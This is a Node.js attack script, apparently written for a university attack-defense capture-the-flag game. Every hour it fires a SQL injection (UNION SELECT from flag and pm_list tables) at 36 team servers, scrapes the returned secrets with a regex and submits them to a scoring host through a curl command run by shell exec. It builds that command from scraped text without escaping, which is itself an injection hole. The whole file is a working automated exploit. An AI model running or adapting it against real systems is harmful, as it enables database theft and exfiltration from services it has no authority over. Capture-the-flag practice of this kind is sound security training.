var http = require('http');
var colors = require('colors');
var exec = require('child_process').exec;
var schedule = require('node-schedule');

var inject = function (team) {
    return "http://10.8." + team.toString() + ".100:7788/menu.php/db/name/1'+UNION+SELECT+*+FROM+flag+UNION+SELECT+*+FROM+pm_list+WHERE+id='2";
}

var submit = function (flag) {
    var command = "curl –L http://people.cs.nctu.edu.tw/~hwcheng/NSFinal/flag.php?ID=13&flag=" + flag.toString();
    child = exec(command);
}

var regex = /\>(\d) (\w*)\<\/div\>/;

var attack = function (team) {
    console.log('ATTACKING: '.green + inject(team));
    var req = http.request(inject(team), function (res) {
        // console.log('STATUS: '.green + res.statusCode);
        //console.log('HEADERS: '.green + JSON.stringify(res.headers));
        //res.setEncoding('utf8');
        res.on('data', function (chunk) {
            match = chunk.toString().match(regex);
            if (match) {
                var flag = match[2];
                console.log('FLAG: '.yellow, team, flag);
                submit(flag);
            }
        });

    });

    req.on('error', function(e) {
      console.log('problem with request: ' + e.message);
    });
    req.end();
}



var rule = new schedule.RecurrenceRule();
rule.minute = 0;
var j = schedule.scheduleJob(rule, function(){
    console.log('START ATTACKING'.red);
    for (i = 0; i < 36; i++)
        attack(i);
});
